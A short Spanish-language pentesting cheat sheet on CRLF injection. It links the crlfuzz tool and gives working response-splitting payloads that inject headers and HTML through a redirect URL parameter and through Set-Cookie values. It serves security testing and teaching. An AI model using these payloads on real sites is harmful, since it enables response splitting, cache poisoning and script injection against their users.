# CRLF

## Summary
- [Tools](#tools)
- [Response Header Injection](#response-header-injection)

## Tools

- [crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## Response Header Injection

Si visualiza algún valor reflejado en la RESPONSE del servidor que puede manipular y fue inyectado en la REQUEST:
```
HTTP/1.1 200 OK
...
Set-Cookie: author=ValorManipulado
Location: http://google.com/fichero.jsp?lang=English
...
```

Modifique e ingrese en su REQUEST un carriage return y line feed:

Si la respuesta ORIGINAL da una redirección 301,302:

```
http://google.com/fichero.jsp?lang=foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>Shazam</html>
```

Si la respuesta ORIGINAL da 200 OK:
```
Set-Cookie: author=CGonzalo\r\nContent-Length:19\r\n\r\n<html>Shazam</html>
```

```
Set-Cookie: author=CGonzalo%0d%0aContent-Length:19%0d%0a%0d%0a<html>Shazam</html>
```

*NOTA: El header "Content-Lenght: `[value]` debe coincidir con el HTML malicioso inyectado.*

